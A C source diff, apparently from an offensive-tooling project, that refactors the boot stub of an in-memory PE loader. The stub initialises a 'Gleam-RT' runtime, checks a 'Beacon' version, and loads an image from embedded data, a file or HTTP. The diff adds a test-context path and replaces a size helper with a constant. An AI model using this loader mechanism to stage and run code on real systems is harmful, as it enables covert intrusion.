@@ -24,20 +24,36 @@ static void* loadImageFromEmbed(Runtime_M* runtime, byte* config);
 static void* loadImageFromFile(Runtime_M* runtime, byte* config);
 static void* loadImageFromHTTP(Runtime_M* runtime, byte* config);
 
-static Runtime_M* initRuntime(void* boot, Runtime_Opts* opts);
-static uint32     pe_loader_size();
+static Runtime_M* initRuntime();
 
 errno Boot(void* ctx)
 {
-    // initialize Gleam-RT for PE Loader
-    Runtime_M* runtime = initRuntime(GetFuncAddr(&Boot), NULL);
-    if (runtime == NULL)
+    // process extended context
+    CTX_Test* testCtx = NULL;
+    if (ctx != NULL)
     {
-        return GetLastErrno();
+        switch (*(uint*)ctx)
+        {
+        case CTX_TYPE_TEST:
+            testCtx = ctx;
+            break;
+        default:
+            break;
+        }
     }
 
-    // reserved context and extended arguments
-    (void)ctx;
+    // initialize Gleam-RT for PE Loader
+    Runtime_M* runtime = NULL;
+    if (testCtx == NULL)
+    {
+        runtime = initRuntime();
+        if (runtime == NULL)
+        {
+            return GetLastErrno();
+        }
+    } else {
+        runtime = testCtx->Runtime;
+    }
 
     // store boot configuration
     Config config;
@@ -48,29 +64,37 @@ errno Boot(void* ctx)
     errno err = NO_ERROR;
     for (;;)
     {
-        // load config from argument stub
-        err = loadConfig(runtime, &config);
-        if (err != NO_ERROR)
+        uint32 mode  = 0;
+        void*  image = NULL;
+        if (testCtx == NULL)
         {
-            break;
-        }
-        // check the Beacon version
-        uint32 mode = 0;
-        if (config.Version >= 0x0400 && config.Version < 0x0500)
-        {
-            mode = BOOT_MODE_V1;
-        }
-        if (mode == 0)
-        {
-            err = ERR_UNSUPPORTED_VERSION;
-            break;
-        }
-        // prepare pe image data to config
-        void* image = loadImage(runtime, config.Image);
-        if (image == NULL)
-        {
-            err = GetLastErrno();
-            break;
+            // load config from argument stub
+            err = loadConfig(runtime, &config);
+            if (err != NO_ERROR)
+            {
+                break;
+            }
+            // select boot mode from the version
+            if (config.Version >= 0x0400 && config.Version < 0x0500)
+            {
+                mode = BOOT_MODE_V1;
+            }
+            if (mode == 0)
+            {
+                err = ERR_UNSUPPORTED_VERSION;
+                break;
+            }
+            // prepare pe image data to config
+            image = loadImage(runtime, config.Image);
+            if (image == NULL)
+            {
+                err = GetLastErrno();
+                break;
+            }
+        } else {
+            mode  = BOOT_MODE_V1;
+            image = testCtx->Image;
+            config.TestWait = true;
         }
         // prevent incorrect optimization
         PELoader_Cfg cfg;
@@ -124,7 +148,7 @@ errno Boot(void* ctx)
         return err;
     }
 
-    // wait main thread for test stage
+    // wait main thread for test fake stage
     if (!config.TestWait)
     {
         return NO_ERROR;
@@ -299,19 +323,11 @@ static void* loadImageFromHTTP(Runtime_M* runtime, byte* config)
     return resp.Body.buf;
 }
 
-static Runtime_M* initRuntime(void* boot, Runtime_Opts* opts)
+static Runtime_M* initRuntime()
 {
     uintptr base = (uintptr)(GetFuncAddr(&InitPELoader));
-    uintptr addr = base + pe_loader_size();
+    uintptr addr = base + STUB_PE_LOADER_SIZE;
     typedef Runtime_M* (*InitRuntime_t)(void* boot, Runtime_Opts* opts);
     InitRuntime_t init = (InitRuntime_t)addr;
-    return init(boot, opts);
+    return init(GetFuncAddr(&Boot), NULL);
 }
-
-// the size will be replaced by builder or generator
-#pragma optimize("", off)
-static uint32 pe_loader_size()
-{
-    return STUB_PE_LOADER_SIZE;
-}
-#pragma optimize("", on)
